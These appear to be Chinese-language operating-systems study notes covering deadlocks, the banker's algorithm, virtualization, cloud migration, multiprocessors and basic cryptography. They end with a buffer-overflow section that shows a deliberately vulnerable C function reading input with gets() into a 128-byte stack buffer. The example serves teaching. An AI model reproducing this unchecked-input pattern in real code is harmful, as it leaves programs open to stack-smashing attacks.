打破死锁最原始和最简单的方法是杀死一个或多个进程。一种可能是在循环中终止一个进程。运气好的话，其他的过程还能继续。如果这没有帮助，它可以重复，直到循环被打破。或者，可以选择不在循环中的进程作为受害者，以便释放其资源。在这种方法中，要终止的进程是经过仔细选择的，要求其持有循环中某些进程所需的资源。例如，一个进程可能拥有一台打印机并想要一台绘图仪，而另一个进程拥有一台绘图仪并想要一台打印机。这两者陷入了僵局。第三个进程可能拥有另一台相同的打印机和另一台相同的绘图仪，并愉快地运行。终止第三个进程将释放这些资源，并打破涉及前两个进程的死锁。在可能的情况下，最好终止一个可以从头开始重新运行而不会产生不良影响的进程。例如，编译总是可以重新运行，因为它所做的只是读取源文件并生成目标文件。如果它在中途被杀死，第一次运行对第二次运行没有影响。另一方面，更新数据库的进程不能总是安全地运行第二次。如果进程向数据库中表的某个字段添加1，那么运行它一次，杀死它，然后再次运行它将向该字段添加2，这是不正确的。



### 避免死锁

在讨论死锁检测时，我们默认一个进程在请求资源时一次请求所有资源。然而，在大多数系统中，每次只请求一个资源。系统必须能够决定授予资源是否安全，并仅在安全时进行分配。因此，问题出现了：是否存在一种算法，可以通过始终做出正确的选择来避免死锁？答案是肯定的——我们可以避免死锁，但前提是提前获得某些信息。在本节中，我们将研究通过谨慎的资源分配来避免死锁的方法。

#### 资源轨迹

避免死锁的主要算法是基于安全状态的概念。在描述它们之前，我们将稍微离题一下，以图形化和易于理解的方式来看待安全的概念。尽管图形化方法不能直接转化为可用的算法，但它对问题的性质提供了很好的直观感觉。

#### 安全和不安全状态

如果存在某种调度顺序，即使所有进程都突然立即请求其最大数量的资源，每个进程也可以运行到完成，那么这种状态就是安全的。

一种安全的状态

![image-20231009223859031](D:\TyporaImages\image-20231009223859031.png)

在（a）中还剩下3个设备，A已经有了3个，但是一共需要9个，所以还需要6个，其它一次类推。在（b）中将2个设备分给B，剩余1个，在（c）中，B结束进程释放资源，还剩下5个，在（d）中，分配5个给C，没有剩下的，在（e）中C结束进程释放资源，最后剩下7个，可以满足A的需求。所以是安全的状态。

下面则是一种不安全的状态

![image-20231009224250071](D:\TyporaImages\image-20231009224250071.png)

值得注意的是，不安全状态不是死锁状态。从（b）开始，系统可以运行一段时间。事实上，一个过程甚至可以完成。此外，A可能会在请求更多资源之前释放资源，从而允许C完成并完全避免死锁。因此，安全状态和不安全状态之间的区别在于，在安全状态下，系统可以保证所有进程都将完成;在不安全的状态下，无法给出这样的保证。

#### 单资源情况下的Banker算法

Banker算法在每个请求发生时，观察允许它是否会达到安全状态。如果是，请求被批准；否则，它将被推迟到以后。为了判断一个状态是否安全，banker会检查他是否有足够的资源来满足某些客户。如果是，则假定这些贷款已经偿还，并检查现在最接近限额的客户，依此类推。如果所有的贷款最终都能偿还，那么state就安全了，最初的请求就可以得到批准。

#### 多资源情况下的Banker算法

类似之前的做法，定义两个矩阵，分别为$C$（当前分配矩阵），$R$（请求矩阵）和三个向量，分别为$E$（资源总数），$P$（已经被分配的资源），$A$（可用资源）。

现在可以声明用于检查状态是否安全的算法。

1. 寻找$R$中的一行，其中未满足的资源需求都小于或等于$A$。如果不存在这样的行，系统最终将死锁，因为没有进程可以运行到完成(假设进程保留所有资源直到退出)。
2. 假设所选行的进程请求了它所需的所有资源(这保证是可能的)并完成。将该进程标记为终止，并将其所有资源添加到$A$向量中。
3. 重复步骤1和步骤2，直到所有进程都被标记为终止(在这种情况下，初始状态是安全的)，或者没有进程可以满足其资源需求(在这种情况下，系统是不安全的)。

banker算法尽管理论上算法很好，但在实践中它基本上是无用的，因为进程很少事先知道它们的最大资源需求是多少。此外，进程的数量不是固定的，而是随着新用户登录和退出而动态变化的。此外，被认为可用的资源可能会突然消失(磁带驱动器可能会损坏)。因此，在实践中，很少有(如果有的话)现有系统使用banker算法来避免死锁。然而，有些系统使用类似于banker算法的启发式方法来防止死锁。例如，当缓冲区利用率高于70%时，网络可能会限制流量——估计剩余的30%将足以让当前用户完成他们的服务并返回他们的资源。

### 防止死锁

知道了避免死锁本质上是不可能的，因为它需要关于未来请求的信息，而这些信息是未知的，那么真实的系统如何避免死锁呢？答案是回到死锁的四个条件，看看它们是否能提供线索。如果我们能够确保这些条件中至少有一个永远不满足，那么死锁将在结构上是不可能的。

#### 互斥条件

如果没有资源被排他性地分配给单个进程，就永远不会有死锁。对于数据，最简单的方法是将数据设置为只读，以便进程可以并发地使用数据。然而，同样清楚的是，允许两个进程同时在打印机上写入将导致混乱。通过假脱机打印机输出，多个进程可以同时生成输出。在此模型中，实际请求物理打印机的唯一进程是打印机守护进程。由于守护进程从不请求任何其他资源，我们可以消除打印机的死锁。如果将守护进程编程为在所有输出被假脱机处理之前就开始打印，那么如果一个输出进程决定在第一次突然输出后等待几个小时，则打印机可能处于空闲状态。由于这个原因，守护进程通常被编程为只有在完整的输出文件可用后才打印。然而，这一决定本身可能导致僵局。如果两个进程各自用输出填充了可用假脱机空间的一半，并且都没有完成全部输出，会发生什么情况？在这种情况下，我们将有两个进程，它们各自完成了输出的一部分，但不是全部，并且无法继续。这两个进程都不会完成，所以我们会在磁盘上出现死锁。然而，这里有一个经常适用的想法的萌芽。除非绝对必要，否则避免分配资源，并尝试确保实际占用资源的进程尽可能少。

#### Hold-and-Wait条件

如果我们可以防止占用资源的进程等待更多的资源，我们就可以消除死锁。实现这一目标的一种方法是要求所有进程在开始执行之前请求它们的所有资源。如果所有的东西都可用，那么进程将被分配它所需要的任何东西，并且可以运行到完成。如果一个或多个资源处于繁忙状态，则不会分配任何资源，进程将只是等待。这种方法的一个直接问题是，许多进程在开始运行之前不知道它们需要多少资源。事实上，如果他们知道，banker算法就可以被使用。另一个问题是，这种方法不能最优地利用资源。举个例子，一个进程从输入磁带中读取数据，用一个小时对其进行分析，然后写入输出磁带并绘制结果。如果必须提前请求所有资源，则该过程将占用输出磁带驱动器和绘图仪一个小时。然而，一些大型机批处理系统要求用户在每个作业的第一行列出所有资源。然后，系统立即预先分配所有资源，直到作业不再需要它们时才释放它们(或者在最简单的情况下，直到作业完成)。虽然这种方法给程序员增加了负担并浪费了资源，但它确实防止了死锁。打破保持和等待条件的一种稍微不同的方法是要求请求资源的进程首先临时释放它当前持有的所有资源。然后，它试图一次得到它所需要的一切。

#### No-Preemption条件

如果一个进程已经分配了打印机，并且正在打印其输出，那么因为没有所需的绘图仪而强行拿走打印机是很棘手的，最坏的情况是不可能的。但是，可以对某些资源进行虚拟化以避免这种情况。将打印机输出假脱机到磁盘，并只允许打印机守护进程访问真正的打印机，从而消除了涉及打印机的死锁，尽管这可能会导致磁盘空间上的死锁。但是，对于大磁盘，不太可能耗尽磁盘空间。但是，并非所有资源都可以这样虚拟化。例如，操作系统中的数据库或表中的记录必须锁定才能使用，这就存在死锁的可能性。

#### 循环等待条件

循环等待可以通过几种方式消除。一种方法是简单地设置一条规则，规定一个进程在任何时候只能使用一个资源。如果它需要第二个，它必须释放第一个。对于需要将大文件从磁带复制到打印机的进程，此限制是不可接受的。避免循环等待的另一种方法是为所有资源提供一个全局编号。现在的规则是这样的：进程可以随时请求资源，但是所有请求必须按照数字顺序进行。一个进程可能先请求一台打印机，然后再请求磁带机，但它可能不会先请求绘图仪，然后再请求打印机。

根据这条规则，资源分配图永远不会有周期。让我们看看为什么对于两个进程来说这是正确的，假设$A$已经占用了资源$i$，$B$占用了资源$j$。只有当$A$请求资源$j$，$B$请求资源$i$时，才会出现死锁。假设$i$和$j$是不同的资源，它们的数量会不同。如果是$i>j$，那么$A$不允许请求$j$，因为$j$比它已经拥有的$i$要低。如果是$i<j$，那么$B$不允许请求$i$，因为$i$比它已经拥有的$j$要低。无论哪种方式，死锁都是不可能发生的。

对于两个以上的进程，同样的逻辑成立。在每一个瞬间，一个分配的资源将是最高的。持有该资源的进程永远不会请求已经分配的资源。它要么完成，要么在最坏的情况下请求更多数量的资源，所有这些资源都是可用的。最终，它将完成并释放其资源。此时，其他进程将拥有最高的资源，也可以完成任务。简而言之，存在一个所有进程都完成的场景，因此不存在死锁。

该算法的一个小变化是放弃了以严格递增的顺序获取资源的要求，而仅仅坚持进程请求的资源不低于它已经拥有的资源。如果一个进程最初请求9和10，然后释放它们，那么它实际上是重新开始，因此没有理由禁止它现在请求资源1。尽管对资源进行数字排序可以消除死锁的问题，但也许不可能找到一个让所有人都满意的排序。当资源包括进程表槽、磁盘假脱机程序空间、锁定的数据库记录和其他抽象资源时，潜在资源和不同用途的数量可能非常大，以至于无法进行排序。

### other issues

死锁还包括了two-phase、nonresource和starvation。

#### Two-phase Locking

虽然在一般情况下，避免和预防都不是很有希望，但对于特定的应用，许多优秀的专用算法是已知的。例如，在许多数据库系统中，经常发生的操作是请求对若干记录加锁，然后更新所有被锁的记录。当多个进程同时运行时，确实存在死锁的危险。通常使用的方法称为two-phase locking。在第一阶段，进程尝试锁定它需要的所有记录，每次锁定一条。如果成功，则开始第二阶段，执行更新并释放锁。在第一阶段没有真正的工作完成。如果在第一阶段，需要一些已经锁定的记录，则进程只是释放其所有的锁，并从头开始第一阶段。在某种意义上，这种方法类似于提前请求所需的所有资源，或者至少在任何不可逆的事情发生之前请求。在某些版本的两阶段锁定中，如果在第一阶段遇到被锁定的记录，则不需要释放和重新启动。在这些版本中，可能会发生死锁。然而，这种策略并不适用于一般情况。例如，在实时系统和进程控制系统中，因为资源不可用而中途终止进程并重新开始是不可接受的。如果进程已经向网络读写消息、更新文件或其他不能安全重复的内容，那么重新开始也是不可接受的。该算法只适用于程序员精心安排的情况，以便程序可以在第一阶段的任何时候停止并重新启动。许多应用程序不能以这种方式构建。

#### communciation deadlocks

另一种死锁可能发生在通信系统(例如网络)中，其中两个或多个进程通过发送消息进行通信。一种常见的安排是进程A向进程B发送请求消息，然后阻塞，直到B发送回复消息。假设请求消息丢失。A被阻塞等待回复。B被阻塞等待请求它做某事的请求，我们陷入僵局了。通信死锁是协作同步的一种异常现象。这种死锁类型的进程如果独立执行，则无法完成服务。

不能通过对资源进行排序(因为没有资源)来防止通信死锁，也不能通过仔细的调度(因为没有可以延迟请求的时刻)来避免通信死锁。幸运的是，还有另一种通常可以用来打破通信死锁的技术：超时。在大多数网络通信系统中，每当发送需要回复的消息时，都会启动计时器。如果回复到达之前计时器计满时间，则消息的发送方假定消息已丢失，并再次发送消息(如果需要，将一次又一次地发送)。这样，僵局就被打破了。换句话说，超时可以作为一种启发式方法来检测死锁并启用恢复。这种启发式方法也适用于资源死锁，并且对于那些具有可能导致系统死锁和冻结的不稳定或有bug的设备驱动程序的用户来说，这种启发式方法是可靠的。

当然，如果原始消息没有丢失，但回复只是延迟了，预期的收件人可能会收到消息两次或更多次，可能会带来意想不到的后果。更多参见通信网的相关概念。

#### Livelock

在某些情况下，当进程注意到它无法获得它需要的下一个锁时，它会试图通过放弃它已经获得的锁来表示礼貌。然后，它等待一毫秒，然后再次尝试。原则上，这是好的，应该有助于检测和避免死锁。然而，如果另一个进程在完全相同的时间做同样的事情，他们就会处于两个人试图在街上擦肩而过的情况，当他们都礼貌地退后，但没有任何进展是可能的，因为他们一直在同一时间走同一条路。

考虑一个原子原语*try_lock*，调用进程测试互斥锁，要么获取互斥锁，要么返回失败。换句话说，它从不阻塞。程序员可以将它与*acquire_lock*一起使用，后者也试图获取锁，但在锁不可用时阻塞。现在想象一对并行运行的进程（可能在不同的核心上），它们使用两个资源。每个锁都需要两个资源，并使用*try_lock*原语来尝试获取必要的锁。如果尝试失败，进程放弃它持有的锁并再次尝试。假设进程A运行并获取资源1，进程2运行并获取资源2。接下来，它们尝试获取另一个锁，但失败了。出于礼貌，他们放弃了他们目前持有的锁，并再次尝试。这个过程不断重复，直到无聊的用户(或其他实体)把其中一个过程从痛苦中解脱出来。显然，没有进程被阻塞，我们甚至可以说事情正在发生，所以这不是死锁。尽管如此，没有任何进展是可能的，所以我们确实有一个等效的东西:livelock。

Livelock和死锁可能以令人惊讶的方式发生。在某些系统中，允许的进程总数由进程表中的条目数决定。因此，进程表槽是有限的资源。如果由于表已满而导致fork失败，那么执行fork的程序的合理方法是随机等待一段时间，然后再试一次。现在假设UNIX系统有100个进程槽。十个程序正在运行，每个程序需要创建12个子程序。在每个进程创建了9个进程之后，10个原始进程和90个新进程耗尽了表。10个原始进程中的每一个现在都处于一个无限循环中，fork和失败——一个livelock。这种情况发生的可能性很小，但它有可能发生。我们应该放弃进程和fork调用来消除这个问题吗?

打开文件的最大数量同样受到inode表大小的限制，因此当它被填满时也会出现类似的问题。磁盘上的交换空间是另一种有限的资源。实际上，操作系统中的几乎每个表都表示有限的资源。我们是否应该取消所有这些，因为可能发生的情况是，n个过程的集合可能每个过程都要求占总数的1/n，然后每个过程都试图要求另一个?可能不是个好主意。

大多数操作系统(包括UNIX和Windows)基本上都忽略了这个问题，因为它们假设大多数用户更喜欢偶尔的livelock(甚至死锁)，而不是将所有用户限制在一个进程、一个打开的文件和所有内容中的一个。如果这些问题可以免费解决，就不会有太多的讨论了。问题在于代价高昂，主要体现在对流程施加不便的限制方面。因此，我们面临着方便性和正确性之间令人不快的权衡，以及关于哪个更重要、对谁更重要的大量讨论

#### starvation

在动态系统中，对资源的请求一直在发生。需要一些策略来决定谁在何时获得哪些资源。这个策略虽然看起来是合理的，但可能会导致某些进程即使没有死锁也永远得不到服务。例如，考虑打印机的分配。假设系统使用某种算法来确保分配打印机不会导致死锁。现在假设有几个进程同时需要它。谁应该得到它?一种可能的分配算法是将其分配给要打印的文件最小的进程(假设此信息可用)。这种方法看起来很公平。现在考虑一下在一个繁忙的系统中，当一个进程有一个巨大的文件要打印时会发生什么。每当打印机空闲时，系统就会查找并选择文件最短的进程。如果有一个具有短文件的进程流，则永远不会为具有大文件的进程分配打印机。它只会starvation(被无限期地推迟，即使它没有被阻塞)。可以通过使用先到先得的资源分配策略来避免starvation。使用这种方法，等待时间最长的流程将得到下一个服务。在适当的时候，任何给定的进程最终都会成为最老的进程，从而获得所需的资源。



## virtualization and the cloud

### requirements for visualization

hypervisor应该在以下三个方面表现良好：

1. 安全性：hypervisor应该完全控制虚拟化资源。
2. 保真度：程序在虚拟机上的行为应该与在单纯硬件上运行的相同程序的行为相同。
3. 效率：虚拟机中的大部分代码应该在没有管理程序干预的情况下运行。

执行指令的一种毫无疑问的安全方法是在解释器(如Bochs)中依次考虑每个指令，并准确地执行该指令所需的操作。一些指令（不多）可以直接执行。例如，解释器可以简单地按原样执行INC(增量)指令，但是直接执行不安全的指令必须由解释器模拟。例如，我们不能真正允许客户机操作系统禁用整个机器的中断或修改页表映射。诀窍是让管理程序之上的操作系统认为它已经禁用了中断，或者更改了机器的页面映射。稍后我们将看到这是如何完成的。现在，我们只想说解释器可能是安全的，如果仔细实现，甚至可能是高保真的，但性能很差。为了满足性能标准，我们将看到vmm尝试直接执行大部分代码。

现在让我们谈谈保真度。由于Intel 386架构的缺陷，虚拟化长期以来一直是x86架构上的一个问题，这些缺陷以向后兼容的名义被盲目地引入新的cpu长达20年之久。简而言之，每个具有内核模式和用户模式的CPU都有一组指令，这些指令在内核模式下执行时与在用户模式下执行时的行为不同。这些指令包括执行I/O、更改MMU设置等。波佩克和戈德堡称这些为敏感指令。如果在用户模式下执行，还有一组指令会导致陷阱。波佩克和戈德堡称这些为特权指令。他们的论文首次指出，只有当敏感指令是特权指令的子集时，机器才是可虚拟化的。用更简单的语言来说，如果您试图在用户模式下做一些不应该在用户模式下做的事情，那么硬件就会产生陷阱。不像IBM/370有这个特性，英特尔的386没有。如果在用户模式下执行或以不同的行为执行，相当多的敏感386指令会被忽略。例如，POPF指令替换了标志寄存器，它改变了启用/禁用中断的位。在用户模式下，这个位不会改变。因此，386及其后继者不能被虚拟化，因此它们不能直接支持管理程序。事实上，情况比想象的还要糟糕。除了在用户模式下指令无法捕获的问题之外，还有一些指令可以在用户模式下读取敏感状态而不会导致捕获。例如，在2005年之前的x86处理器上，程序可以通过读取其代码段选择器来确定它是在用户模式还是内核模式下运行。如果操作系统执行了此操作并发现它实际上处于用户模式，则可能会根据此信息做出错误的决策。

### type1 and type2 hypervisors

![image-20231010095649316](D:\TyporaImages\image-20231010095649316.png)

第一个在x86结构上的运行的type2 hypervisor是VMware Workstation。

Type 2 hypervisors(有时称为托管管理程序)的大部分功能依赖于主机操作系统(如Windows、Linux或OS x)。当它第一次启动时，它就像一台新启动的计算机，并期望在驱动器中找到包含操作系统的DVD、USB驱动器或CD-ROM。然而，这一次，驱动器可以是一个虚拟设备。例如，可以将映像作为ISO文件存储在主机的硬盘驱动器上，并让管理程序假装它正在从正确的DVD驱动器读取。然后，它通过运行DVD上的安装程序将操作系统安装到其虚拟磁盘(实际上也只是一个Windows、Linux或OS X文件)。一旦在虚拟磁盘上安装了客户操作系统，就可以引导并运行它。

| Virtualizaton method              | Type 1 hypervisor     | Type 2 hypervisor             |
| --------------------------------- | --------------------- | ----------------------------- |
| Virtualization without HW support | ESX Server 1.0        | VMware Wor kstation 1         |
| Paravirtualization                | Xen 1.0               |                               |
| Virtualization with HW support    | vSphere, Xen, Hyper-V | VMware Fusion, KVM, Parallels |
| Process virtualization            |                       | Wine                          |

### techniques for efficient virtualization

可虚拟化性和性能是重要的问题，因此让我们更仔细地研究它们。目前，假设我们有一个支持一个虚拟机的type 1管理程序。与所有类型1的hypervisors一样，它在裸机上运行。虚拟机在用户模式下作为用户进程运行，因此不允许执行敏感指令（在Popek-Goldberg意义上）。但是，虚拟机运行的客户机操作系统认为它处于内核模式(当然，它不是)。我们称之为虚拟内核模式。虚拟机还运行用户进程，这些进程认为它们处于用户模式(实际上处于用户模式)。

当客户机操作系统(它认为自己处于内核模式)执行一条只有在CPU真正处于内核模式时才允许的指令时，会发生什么情况？通常，在没有VT的cpu上，指令失败，操作系统崩溃。在具有VT功能的cpu上，当客户机操作系统执行一条敏感指令时，系统管理程序就会出现一个陷阱，如图7-3所示。然后，管理程序可以检查该指令，看看它是由虚拟机中的客户机操作系统发出的，还是由虚拟机中的用户程序发出的。在前一种情况下，它安排指令的执行;在后一种情况下，它模拟实际硬件在遇到在用户模式下执行的敏感指令时所做的操作。

### Are hypervisors microkernels done right

type1和type2 hypervisors都可以使用未修改的客户机操作系统，但是为了获得良好的性能，必须克服一些困难。我们已经看到，半虚拟化采用了一种不同的方法，即修改客户机操作系统的源代码。半虚拟化的客户机执行超调用，而不是执行敏感指令。实际上，客户机操作系统就像一个用户程序，对操作系统(管理程序)进行系统调用。当采用此路由时，hypervisor必须定义一个接口，该接口由一组客户操作系统可以使用的过程调用组成。这组调用实际上形成了一个API(应用程序编程接口)，尽管它是客户机操作系统而不是应用程序使用的接口。再进一步，通过从操作系统中删除所有敏感指令，只让它进行超级调用来获得I/O等系统服务，我们已经将管理程序变成了一个微内核。在半虚拟化中探讨的思想是，模拟特殊的硬件指令是一项令人不快且耗时的任务。它需要调用管理程序，然后模拟复杂指令的确切语义。让客户机操作系统调用管理程序(或微内核)来执行I/O，等等，这样要好得多。

真正的虚拟化和半虚拟化之间的区别如图所示。这里我们有两个在VT硬件上支持的虚拟机。左边是未修改版本的Windows作为客户机操作系统。当一个敏感指令被执行时，硬件会向管理程序发出一个陷阱，然后管理程序模拟它并返回。右边是修改后的Linux版本，不再包含任何敏感指令。相反，当它需要执行I/O或更改关键的内部寄存器(例如指向页表的寄存器)时，它会调用管理程序来完成工作，就像在标准Linux中应用程序调用系统一样。

![image-20231010103449095](D:\TyporaImages\image-20231010103449095.png)



### Memory virtualization

假设一台虚拟机正在运行，其中的客户机操作系统决定将其虚拟页面7、4和3分别映射到物理页面10、11和12。它构建包含此映射的页表，并加载硬件寄存器以指向顶级页表。这条指令很敏感。在VT CPU上，它会捕获;使用动态转换，它将导致对管理程序过程的调用;在半虚拟化操作系统上，它将生成一个超级调用。为简单起见，让我们假设它被困在类型1的管理程序中，但是在所有三种情况下问题是相同的。hypervisor现在做什么?一种解决方案是将物理页10、11和12分配给这个虚拟机，并设置实际的页表来映射虚拟机的虚拟页7、4和3，以便使用它们。到目前为止，一切顺利。现在假设另一台虚拟机启动并将其虚拟页4、5和6映射到物理页10、11和12，并加载控制寄存器以指向其页表。hypervisor捕捉到了这个陷阱，但是它应该怎么做呢？它不能使用这个映射，因为物理页10、11和12已经在使用中。它可以找到一些空闲页面，比如20、21和22，并使用它们，但是它首先必须创建新的页表，将虚拟机2的虚拟页面4、5和6映射到20、21和22。如果另一个虚拟机启动并尝试使用物理页10、11和12，它必须为它们创建一个映射。通常，对于每个虚拟机，管理程序都需要创建一个影子页表，将虚拟机使用的虚拟页映射到管理程序提供给它的实际页面。更糟糕的是，每次客户机操作系统更改其页表时，管理程序也必须更改影子页表。例如，如果客户机操作系统将虚拟页面7重新映射到它所看到的物理页面200(而不是10)上，则管理程序必须知道这个更改。问题是客户机操作系统可以通过写入内存来更改其页表。不需要任何敏感操作，因此虚拟机监控程序甚至不知道更改，当然也无法更新实际硬件使用的影子页表。

### I/O virtualization

了解了CPU和内存虚拟化之后，我们接下来研究I/O虚拟化。客户机操作系统通常会首先探测硬件，以找出所连接的I/O设备类型。这些探测将捕获到管理程序。管理程序应该做什么?一种方法是让它报告磁盘、打印机等是硬件实际拥有的东西。然后客户机将加载这些设备的设备驱动程序并尝试使用它们。当设备驱动程序尝试执行实际的I/O时，它们将读取和写入设备的硬件设备寄存器。这些指令是敏感的，将捕获到管理程序，然后管理程序可以根据需要将所需的值复制到硬件寄存器或从硬件寄存器复制到硬件寄存器。

但在这里，我们也有一个问题。每个客户机操作系统都认为自己拥有一个完整的磁盘分区，并且虚拟机(数百个)的数量可能比实际磁盘分区的数量要多得多。通常的解决方案是让管理程序在实际磁盘上为每个虚拟机的物理磁盘创建一个文件或区域。由于客户机操作系统试图控制实际硬件拥有的磁盘(并且hypervisor能够理解)，因此它可以将被访问的块号转换为用于存储的文件或磁盘区域的偏移量，并执行I/O操作。

......

### Clouds

虚拟化技术在云计算令人眼花缭乱的崛起中发挥了至关重要的作用。有许多云。有些云是公共的，任何愿意为资源付费的人都可以使用，有些则是组织私有的。同样，不同的云提供不同的东西。有些公司允许用户访问物理硬件，但大多数公司将其环境虚拟化。有些提供裸机，无论虚拟与否，仅此而已，而另一些则提供随时可用的软件，可以以有趣的方式组合，或者提供便于用户开发新服务的平台。云提供商通常提供不同类别的资源，例如“大机器”与“小机器”等。

5个基本特征：

1. 按需自助服务。用户应该能够自动提供资源，而不需要人工交互。
2. 广泛的网络接入。所有这些资源都应该通过标准机制在网络上可用，以便异构设备可以使用它们。
3. 资源池。提供者拥有的计算资源应该被集中起来，以服务于多个用户，并具有动态分配和重新分配资源的能力。用户通常甚至不知道“他们的”资源的确切位置，甚至不知道他们位于哪个国家。
4. 快速的弹性。应该有可能弹性地(甚至可能是自动地)获取和释放资源，以便根据用户的需求立即进行伸缩。
5. 测量服务。云提供商以与商定的服务类型相匹配的方式测量使用的资源。

现代虚拟化解决方案提供的是实时迁移。换句话说，它们在虚拟机仍可运行时移动虚拟机。例如，它们采用预复制内存迁移之类的技术。这意味着它们在机器仍在处理请求时复制内存页。大多数内存页没有写多少，因此复制它们是安全的。请记住，虚拟机仍在运行，因此页面可能在已经复制后被修改。当内存页被修改时，我们必须确保将最新版本复制到目标，因此我们将它们标记为脏的。稍后会再复印。当大多数内存页被复制后，我们只剩下少量脏页。现在，我们非常短暂地暂停以复制剩余的页面，并在新位置恢复虚拟机。虽然仍然有一个暂停，但它是如此短暂，以至于应用程序通常不会受到影响。当停机时间不明显时，它被称为无缝实时迁移。

虚拟机和物理硬件的解耦还有其他优点。特别地，我们提到我们可以暂停机器。这本身是有用的。如果暂停机器的状态(例如，CPU状态、内存页面和存储状态)存储在磁盘上，我们就有了运行机器的快照。如果软件把仍在运行的虚拟机弄得一团糟，可以回滚到快照并继续，就像什么都没发生一样。创建快照最直接的方法是复制所有内容，包括完整的文件系统。然而，复制一个多tb的磁盘可能需要一段时间，即使它是一个快速的磁盘。再说一遍，我们不想在做的时候停顿太久。解决方案是使用写时复制解决方案，这样只有在绝对必要的时候才复制数据。快照工作得很好，但也有问题。如果一台机器正在与一台远程计算机交互，该怎么办?我们可以对系统进行快照，并在稍后的阶段再次启动，但通信方可能早就不在了。显然，这是一个无法解决的问题



## Multiple processor systems

CPU的速度限制：1. 信号传播的速度（必须小于光在光纤中的速度（20cm/nsec）），1THz(1000GHz)的计算机必须小于100微米，才能让信号在一个时钟周期内从一端到达另一端并返回一次；2. 当将计算机造的足够小时，又会遇到散热的问题。

### Multiprocessors

共享内存多处理器(以下简称多处理器)是一种计算机系统，其中两个或多个cpu共享对公共RAM的全部访问权。在任何cpu上运行的程序看到的是一个正常的(通常是分页的)虚拟地址空间。这个系统唯一不同寻常的特性是CPU可以将一些值写入内存字，然后将该字读回来并获得不同的值(因为另一个CPU已经更改了它)。如果组织得当，这个属性构成了处理器间通信的基础：一个CPU将一些数据写入内存，另一个CPU将数据读取出来。在大多数情况下，多处理器操作系统是普通的操作系统。它们处理系统调用、进行内存管理、提供文件系统和管理I/O设备。然而，它们在某些方面有其独特之处。其中包括进程同步、资源管理和调度。下面我们将首先简要介绍多处理器硬件，然后再讨论这些操作系统的问题。

尽管所有多处理器都具有每个CPU都可以寻址所有内存的特性，但有些多处理器还具有读取每个内存字和读取其他内存字一样快的附加特性。这些机器被称为UMA(统一内存访问)多处理器。相反，NUMA(非统一内存访问)多处理器没有这个属性。这种差异存在的原因将在后面变得清晰。

。。。



## Security

### Basics of cryptography

**对称密钥密码学**：信息的发送方和接收方用一个密钥去加密和解密数据。它的最大优势是加/解密速度快，适合于对大数据量进行加密，但密钥管理困难。如RC4

**非对称密钥密码学**：它需要使用一对密钥来分别完成加密和解密操作，一个公开发布，即公开密钥，另一个由用户自己秘密保存，即私用密钥。信息发送者用公开密钥去加密，而信息接收者则用私用密钥去解密。公钥机制灵活，但加密和解密速度却比对称密钥加密慢得多。如RSA，

**数字签名**：一种常见的方法是首先通过很难反转的单向加密散列算法运行文档。散列函数通常产生与原始文档大小无关的固定长度的结果。最常用的散列函数是SHA-1(安全散列算法)，它产生一个20字节的结果(NIST, 1995)。较新的SHA-1版本是SHA-256和SHA-512，它们分别产生32字节和64字节的结果，但迄今为止它们的使用并不广泛。下一步假设使用如上所述的公钥加密。然后，文档所有者将他的私钥应用于*hash*，得到D(*hash*)。这个值被称为签名块，它被附加到文档中并发送给接收者。D对*hash*的应用有时被称为对*hash*进行解密，但这并不是真正的解密，因为*hash*没有被加密。它只是*hash*上的一个数学变换。

要使用此签名方案，接收方必须知道发送方的公钥。一些用户在他们的Web页面上发布他们的公钥。另一些人则不这样做，因为他们可能害怕入侵者闯入并偷偷地改变他们的钥匙。对于他们来说，需要一种替代机制来分发公钥。一种常见的方法是消息发送者将证书附加到消息中，该证书包含用户的姓名和公钥，并由受信任的第三方进行数字签名。一旦用户获得了可信第三方的公钥，他就可以接受所有使用该可信第三方生成证书的发送者的证书。签署证书的受信任第三方称为CA(证书颁发机构)。但是，对于用户验证由CA签名的证书，用户需要CA的公钥。这是从哪里来的，用户怎么知道它是真的？要以一般的方式做到这一点，需要一个管理公钥的完整方案，称为PKI(公钥基础设施)。对于Web浏览器，这个问题以一种特殊的方式解决了：所有浏览器都预装了大约40个流行ca的公钥。

**可信芯片**：TPM(可信平台模块)是一种加密处理器，内部有一些非易失性存储密钥。TPM可以对主存中的明文块进行加密或对密文块进行解密等加密操作。它还可以验证数字签名。当所有这些操作都在专门的硬件上完成时，它们会变得快得多，并可能得到更广泛的应用。

TPM极具争议性，因为不同的各方对于谁将控制TPM以及它将保护谁免受谁的侵害有不同的想法。微软一直是这一概念的大力倡导者，并开发了一系列技术来使用它，包括Palladium、NGSCB和BitLocker。在它看来，操作系统控制TPM并使用它来加密硬盘驱动器。但是，它还希望使用TPM来防止未经授权的软件运行。“未经授权的软件”可能是盗版(即非法复制)软件或只是操作系统未授权的软件。如果TPM参与到引导过程中，它可能只启动由制造商放置在TPM内部的密钥签名的操作系统，并且只向选定的操作系统供应商(例如，Microsoft)公开。因此，TPM可用于将用户对软件的选择限制在计算机制造商批准的软件范围内。

### Exploiting software

#### Buffer overflow attacks

许多攻击是由于几乎所有的操作系统和大多数系统程序都是用C或c++编程语言编写的而出现的（因为程序员喜欢它们，它们可以被编译成非常高效的目标代码）。不幸的是，C或c++编译器不会进行数组边界检查。例如，C库函数gets会将字符串（未知大小）读入固定大小的缓冲区，但不检查是否溢出，它因容易受到此类攻击而臭名昭著（有些编译器甚至会检测到gets的使用并对此发出警告）。以下面的C语言程序为例：

```c
void A(){
    char B[128];		// 在堆栈上预留一个128字节的缓冲区
    printf("Type log message");
    gets(B);			// 将登录信息从标准输入读入缓冲区
    writeLog(B);		// 将字符串以更好的格式输出到登录文件中
}
```

上面的代码有一个严重的错误，尽管它可能不会立即明显。这个问题是由于*gets*从标准输入中读取字符，直到遇到换行字符为止。它不知道缓冲区B只能容纳128字节。假设用户键入一行256个字符。剩下的128字节怎么办?由于*gets*不检查缓冲区边界是否违反，因此剩余的字节也将存储在堆栈中，就好像缓冲区有256字节长一样。最初存储在这些内存位置的所有内容都被简单地覆盖。其后果通常是灾难性的。

那么，如果用户提供超过128个字符会发生什么呢？如上所述，*gets*函数将所有字节复制到缓冲区内，可能覆盖堆栈上的许多内容，但特别会覆盖先前推入的返回地址。换句话说，部分登录信息现在填充了系统假定保存函数返回时要跳转到的指令的地址的内存位置。只要用户键入一个常规的登录信息，信息的字符很可能不代表一个有效的代码地址。函数A一返回，程序就会尝试跳转到一个无效的目标——这是系统根本不喜欢的。在大多数情况下，程序会立即崩溃。

